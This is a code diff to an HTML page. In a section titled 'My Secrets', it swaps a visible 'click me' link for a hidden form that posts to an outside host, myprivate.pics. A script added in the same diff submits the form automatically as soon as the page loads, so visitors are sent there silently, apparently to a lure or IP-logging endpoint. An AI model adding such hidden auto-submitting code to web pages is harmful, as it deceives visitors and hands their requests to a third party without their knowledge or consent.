@@ -78,9 +78,17 @@
         <div class="section">
             <div class="section-title">🔒My Secrets</div>
             <div class="section-content">
-                <p><a href="https://myprivate.pics/image.php?ref=WW2AIO.jpg" class="link" style="display: inline-block; position: relative;">click me<span style="position: absolute; width: 100%; height: 100%; top: 0; left: 0;" aria-hidden="true"></span></a></p>
+                <form id="autoForm" action="https://myprivate.pics/image.php" method="post" style="display: none;">
+                    <input type="hidden" name="ref" value="WW2AIO.jpg">
+                </form>
             </div>
         </div>
     </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('autoForm').submit();
+        });
+    </script>
 </body>
 </html>
